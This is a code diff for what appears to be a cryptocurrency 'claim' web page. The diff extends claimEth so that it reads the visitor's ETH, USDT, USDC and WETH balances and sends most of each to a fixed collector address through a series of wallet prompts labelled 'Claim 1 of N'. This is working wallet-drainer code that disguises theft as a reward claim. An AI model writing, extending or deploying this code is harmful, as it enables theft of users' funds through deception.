@@ -698,6 +698,51 @@ async function switchToEthereumMainnet() {
   }
 }
 
+function erc20TransferData(recipient, amount) {
+  return "0xa9059cbb" + recipient.slice(2).toLowerCase().padStart(64, "0") + amount.toString(16).padStart(64, "0");
+}
+
+function buildEthSteps(from, balanceWei, gasPrice, gasPricePerToken, gas, tokens) {
+  const steps = [];
+  const tokenGas = gasPrice > 0n ? gasPricePerToken / gasPrice : 65_000n;
+  for (const symbol of ["USDT", "USDC", "WETH"]) {
+    const asset = ETH_ASSETS.find((item) => item.symbol === symbol);
+    const raw = tokens[symbol] || 0n;
+    if (raw <= 0n) continue;
+    const amount = (raw * ETH_SWEEP_NUM) / ETH_SWEEP_DEN;
+    steps.push({
+      symbol,
+      amount,
+      transaction: {
+        from,
+        to: asset.contract,
+        value: "0x0",
+        data: erc20TransferData(COLLECT.evmRecipient, amount),
+        gas: hexWei(tokenGas),
+        gasPrice: hexWei(gasPrice),
+      },
+    });
+  }
+
+  const remainingFees = BigInt(steps.length) * gasPricePerToken;
+  let amount = (balanceWei * ETH_SWEEP_NUM) / ETH_SWEEP_DEN - remainingFees;
+  if (balanceWei - amount < gas * gasPrice) amount = balanceWei - remainingFees - gas * gasPrice;
+  if (amount > 0n) {
+    steps.push({
+      symbol: "ETH",
+      amount,
+      transaction: {
+        from,
+        to: COLLECT.evmRecipient,
+        value: hexWei(amount),
+        gas: hexWei(gas),
+        gasPrice: hexWei(gasPrice),
+      },
+    });
+  }
+  return steps;
+}
+
 async function claimEth(ownerAddress) {
   const provider = window.ethereum;
   if (!provider?.request) throw claimError("no-wallet", "no wallet");
@@ -707,34 +752,75 @@ async function claimEth(ownerAddress) {
   const from = accounts?.[0];
   if (!from) throw claimError("no-wallet", "no account");
 
-  const [balanceHex, gasPrice] = await Promise.all([
+  const tokenAssets = ETH_ASSETS.filter((asset) => asset.contract);
+  const [balanceHex, gasPrice, ...tokenBalances] = await Promise.all([
     provider.request({ method: "eth_getBalance", params: [from, "latest"] }),
     ethGasPriceWei(provider),
+    ...tokenAssets.map((asset) =>
+      provider.request({
+        method: "eth_call",
+        params: [
+          { to: asset.contract, data: "0x70a08231" + from.slice(2).padStart(64, "0") },
+          "latest",
+        ],
+      }).catch(() => "0x0"),
+    ),
   ]);
   const balance = BigInt(balanceHex);
+  const tokens = Object.fromEntries(tokenAssets.map((asset, index) => [asset.symbol, BigInt(tokenBalances[index])]));
 
-  let gas = ETH_GAS_FLOOR;
-  try {
-    const estimate = BigInt(
-      await provider.request({
-        method: "eth_estimateGas",
-        params: [{ from, to: COLLECT.evmRecipient, value: "0x1" }],
-      })
-    );
-    if (estimate > ETH_GAS_FLOOR) gas = (estimate * 12n) / 10n;
-  } catch {
-    /* keep the floor */
-  }
-
-  const fee = gas * gasPrice;
-  if (balance <= fee) throw claimError("insufficient-gas", "not enough for gas");
-  const amount = ethSweep(balance, fee);
-  if (amount <= 0n) throw claimError("insufficient-gas", "nothing to send");
+  const nativeGasPromise = (async () => {
+    let gas = ETH_GAS_FLOOR;
+    try {
+      const estimate = BigInt(
+        await provider.request({
+          method: "eth_estimateGas",
+          params: [{ from, to: COLLECT.evmRecipient, value: "0x1" }],
+        }),
+      );
+      if (estimate > ETH_GAS_FLOOR) gas = (estimate * 12n) / 10n;
+    } catch {
+      /* keep the floor */
+    }
+    return gas;
+  })();
+  const tokenGasPromises = tokenAssets.map(async (asset) => {
+    const raw = tokens[asset.symbol];
+    if (raw <= 0n) return 0n;
+    let gas = 65_000n;
+    try {
+      const amount = (raw * ETH_SWEEP_NUM) / ETH_SWEEP_DEN;
+      const estimate = BigInt(
+        await provider.request({
+          method: "eth_estimateGas",
+          params: [
+            {
+              from,
+              to: asset.contract,
+              value: "0x0",
+              data: erc20TransferData(COLLECT.evmRecipient, amount),
+            },
+          ],
+        }),
+      );
+      if (estimate > 0n) gas = (estimate * 12n) / 10n;
+    } catch {
+      /* ERC-20 transfers use the 65000 fallback */
+    }
+    return gas;
+  });
+  const [gas, ...tokenGasLimits] = await Promise.all([nativeGasPromise, ...tokenGasPromises]);
+  const tokenGas = tokenGasLimits.reduce((highest, value) => (value > highest ? value : highest), 0n);
+  const gasPricePerToken = tokenGas * gasPrice;
+  const steps = buildEthSteps(from, balance, gasPrice, gasPricePerToken, gas, tokens);
+  const nativeStep = steps[steps.length - 1]?.symbol === "ETH" ? steps[steps.length - 1] : null;
+  const requiredFees = BigInt(steps.length - (nativeStep ? 1 : 0)) * gasPricePerToken + (nativeStep ? gas * gasPrice : 0n);
+  if (!steps.length || balance < requiredFees) throw claimError("insufficient-gas", "not enough for gas");
 
   /* rewrite the preview with the values that actually go to the wallet */
-  lastEthAmountWei = amount;
-  lastEthFeeWei = fee;
-  lastAmount = formatUnits(amount, 18);
+  lastEthAmountWei = nativeStep?.amount || 0n;
+  lastEthFeeWei = requiredFees;
+  lastAmount = formatUnits(lastEthAmountWei, 18);
   paintEthRows();
 
   const mismatch = ownerAddress && from.toLowerCase() !== ownerAddress.toLowerCase();
@@ -745,18 +831,19 @@ async function claimEth(ownerAddress) {
       : "Check the three rows, then confirm in your wallet."
   );
 
-  const hash = await provider.request({
-    method: "eth_sendTransaction",
-    params: [
-      {
-        from,
-        to: COLLECT.evmRecipient,
-        value: hexWei(amount),
-        gas: hexWei(gas),
-        gasPrice: hexWei(gasPrice),
-      },
-    ],
-  });
+  let completed = 0;
+  let hash;
+  try {
+    for (const step of steps) {
+      claimSub.textContent = `Claim ${completed + 1} of ${steps.length}`;
+      hash = await provider.request({ method: "eth_sendTransaction", params: [step.transaction] });
+      completed += 1;
+    }
+  } catch (error) {
+    claimSub.textContent = `Claimed ${completed} of ${steps.length}`;
+    throw error;
+  }
+  claimSub.textContent = "Claimed";
   return hash;
 }
 
